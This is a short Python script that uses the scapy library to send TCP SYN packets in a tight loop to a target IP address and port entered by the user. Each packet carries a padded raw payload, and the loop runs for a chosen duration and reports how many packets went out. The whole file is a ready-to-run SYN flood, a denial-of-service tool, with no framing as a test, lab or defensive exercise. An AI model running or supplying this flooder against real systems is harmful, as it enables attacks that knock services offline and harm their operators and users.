from scapy.all import *


def send_tcp_syn(destination_ip, destination_port, duration, packet_size):
    start_time = time.time()
    end_time = start_time + duration
    count = 0

    ip = IP(dst=destination_ip)
    tcp = TCP(dport=destination_port, flags="S")
    packet = ip / tcp / Raw(b'X' * packet_size)

    while time.time() < end_time:
        send(packet, verbose=False)
        count += 1

    print(f"Sent {count} TCP SYN packets in {duration} seconds.")


if __name__ == "__main__":
    destination_ip = input("Enter destination IP address: ")
    destination_port = int(input("Enter destination port: "))
    duration = int(input("Enter duration (in seconds): "))
    packet_size = int(input("Enter packet size: "))

    send_tcp_syn(destination_ip, destination_port, duration, packet_size)
